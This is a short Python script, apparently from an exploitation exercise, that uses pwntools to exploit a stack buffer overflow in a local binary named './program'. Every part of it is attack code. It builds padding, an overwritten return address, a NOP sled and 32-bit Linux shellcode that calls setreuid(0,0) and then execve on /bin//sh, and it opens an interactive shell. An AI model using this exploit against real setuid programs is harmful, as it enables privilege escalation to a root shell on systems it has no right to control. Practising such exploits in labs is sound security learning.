#!/usr/bin/env python
import pwn
import sys

shellcode = "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"

buffsize = 172
buff = 'A' * buffsize
eip = pwn.pack(0xffffd6c0 + 20)  # some stack position equivalent to 0x90
nops = "\x90" * 50
payload = buff + eip + nops + shellcode


if 2 == len(sys.argv) and 'test' == sys.argv[1]:
    open('payload.txt', 'w').write(payload)
    print(payload)
else:
    elf = pwn.ELF('./program')

    p = elf.process()
    p.sendline(payload)
    p.interactive()
